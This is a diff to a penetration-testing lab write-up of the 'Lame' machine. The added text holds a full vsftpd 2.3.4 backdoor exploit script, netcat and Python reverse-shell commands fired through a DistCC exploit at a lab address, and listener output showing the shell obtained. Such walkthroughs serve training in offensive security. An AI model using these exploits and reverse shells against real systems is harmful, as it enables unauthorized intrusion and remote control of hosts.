@@ -317,7 +317,62 @@ ftp>
 
 #### VSFTPd Remote Command Execution (Not Exploitable)
 
+Since the version of VSFTPd matched with searchsploit query results, I carried out the VSFTPd Remote Command Execution exploit but it didn't work probably due to the ports/services being firewalled.
 
+```
+earchsploit vsftpd 2.3.4           
+---------------------------------------------------------------------------------------------------------------------------------------------------------- ---------------------------------
+ Exploit Title                                                                                                                                            |  Path
+---------------------------------------------------------------------------------------------------------------------------------------------------------- ---------------------------------
+vsftpd 2.3.4 - Backdoor Command Execution                                                                                                                 | unix/remote/49757.py
+vsftpd 2.3.4 - Backdoor Command Execution (Metasploit)                                                                                                    | unix/remote/17491.rb
+---------------------------------------------------------------------------------------------------------------------------------------------------------- ---------------------------------
+```
+
+Exploit used:
+
+```python
+# Exploit Title: vsftpd 2.3.4 - Backdoor Command Execution
+# Date: 9-04-2021
+# Exploit Author: HerculesRD
+# Software Link: http://www.linuxfromscratch.org/~thomasp/blfs-book-xsl/server/vsftpd.html
+# Version: vsftpd 2.3.4
+# Tested on: debian
+# CVE : CVE-2011-2523
+
+#!/usr/bin/python3   
+                                                           
+from telnetlib import Telnet 
+import argparse
+from signal import signal, SIGINT
+from sys import exit
+
+def handler(signal_received, frame):
+    # Handle any cleanup here
+    print('   [+]Exiting...')
+    exit(0)
+
+signal(SIGINT, handler)                           
+parser=argparse.ArgumentParser()        
+parser.add_argument("host", help="input the address of the vulnerable host", type=str)
+args = parser.parse_args()       
+host = args.host                        
+portFTP = 21 #if necessary edit this line
+
+user="USER anonymous"
+password="PASS "
+
+tn=Telnet(host, portFTP)
+tn.read_until(b"(vsFTPd 2.3.4)") #if necessary, edit this line
+tn.write(user.encode('ascii') + b"\n")
+tn.read_until(b"password.") #if necessary, edit this line
+tn.write(password.encode('ascii') + b"\n")
+
+tn2=Telnet(host, 6200)
+print('Success, shell opened')
+print('Send `exit` to quit shell')
+tn2.interact()
+```
 
 #### Samba 3.0.20 Remote Code Execution - [CVE-2007-2447](https://www.samba.org/samba/security/CVE-2007-2447.html) (Privilege Escalation)
 
@@ -363,7 +418,7 @@ We setup a netcat listener on the attacker terminal:
 nc -vnlp 8888
 ```
 
-Then we execute the code:
+Then we execute the code/exploit to directly get a shell into the target as a root user:
 
 ```
 ./smbusrmap.py 10.10.10.3 445 10.10.16.4 8888
@@ -371,7 +426,7 @@ Then we execute the code:
 
 <figure><img src="../.gitbook/assets/image (14).png" alt=""><figcaption><p>Exploit Execution</p></figcaption></figure>
 
-<figure><img src="../.gitbook/assets/smb_cve_exploited.png" alt=""><figcaption><p>Reverse Shell</p></figcaption></figure>
+<figure><img src="../.gitbook/assets/smb_cve_exploited.png" alt=""><figcaption><p>Reverse Shell directly into root user</p></figcaption></figure>
 
 #### DistCC 4.2.4 Remote Command Execution - [CVE-2004-2687](https://nvd.nist.gov/vuln/detail/CVE-2004-2687)
 
@@ -466,7 +521,57 @@ except IOError:
     parse.error
 ```
 
+We start a netcat listener on the attacker terminal
 
+```
+nc -vnlp 9999
+```
+
+Then we execute the exploit using a suitable payload. For the first case I have used a netcat shell:
+
+{% code overflow="wrap" %}
+```bash
+./disccd_exploit.py -t 10.10.10.3 -p 3632 -c "nc 10.10.16.4 9999 -e /bin/sh"
+```
+{% endcode %}
+
+```bash
+> nc -vnlp 9999
+listening on [any] 9999 ...
+connect to [10.10.16.4] from (UNKNOWN) [10.10.10.3] 54964
+id
+uid=1(daemon) gid=1(daemon) groups=1(daemon)
+whoami
+daemon
+```
+
+A python shell can be used too for better interactivity:
+
+{% code overflow="wrap" %}
+```python
+python3 distccd.py -t 10.10.10.3 -p 3632 -c "python -c 'import socket,subprocess,os;s=socket.socket(socket.AF_INET,socket.SOCK_STREAM);s.connect((\"10.10.16.4\",9999));os.dup2(s.fileno(),0); os.dup2(s.fileno(),1); os.dup2(s.fileno(),2);p=subprocess.call([\"/bin/bash\",\"-i\"]);'"
+```
+{% endcode %}
+
+```bash
+nc -vnlp 9999
+listening on [any] 9999 ...
+connect to [10.10.16.4] from (UNKNOWN) [10.10.10.3] 47919
+bash: no job control in this shell
+daemon@lame:/tmp$ ls
+5561.jsvc_up
+distcc_6c1267df.stderr
+distcc_6c1267df.stdout
+distccd_6c1267df.i
+distccd_6c1267df.o
+gconfd-makis
+orbit-makis
+vgauthsvclog.txt.0
+vmware-root
+daemon@lame:/tmp$
+```
+
+This lands us into a shell as `daemon` user, for whom we have to perform privilege escalations to eventually gain persistence.
 
 ### Privilege Escalation
 
